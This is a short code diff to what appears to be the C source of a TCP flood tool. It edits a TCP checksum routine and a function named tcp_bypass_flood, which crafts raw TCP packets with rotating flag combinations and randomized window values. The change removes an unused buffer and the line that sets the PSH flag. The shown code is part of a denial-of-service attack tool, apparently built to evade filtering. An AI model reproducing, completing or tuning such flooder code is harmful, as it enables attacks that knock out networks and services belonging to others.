@@ -163,7 +163,6 @@ unsigned short checksum(unsigned short *buffer, int size) {
 }
 
 unsigned short tcp_checksum(struct tcphdr *tcp, int tcp_len, uint32_t saddr, uint32_t daddr) {
-    uint8_t packet[4096];
     uint32_t sum = 0;
     struct pseudo_header {
         uint32_t source_address;
@@ -575,7 +574,6 @@ void *tcp_bypass_flood(void *arg) {
         if (flags[flag_index] & TH_ACK) tcp_header->ack = 1;
         if (flags[flag_index] & TH_FIN) tcp_header->fin = 1;
         if (flags[flag_index] & TH_RST) tcp_header->rst = 1;
-        if (flags[flag_index] & TH_PSH) tcp_header->psh = 1;
         
         tcp_header->window = htons(1024 + (rand() % 64511));
         tcp_header->check = 0;
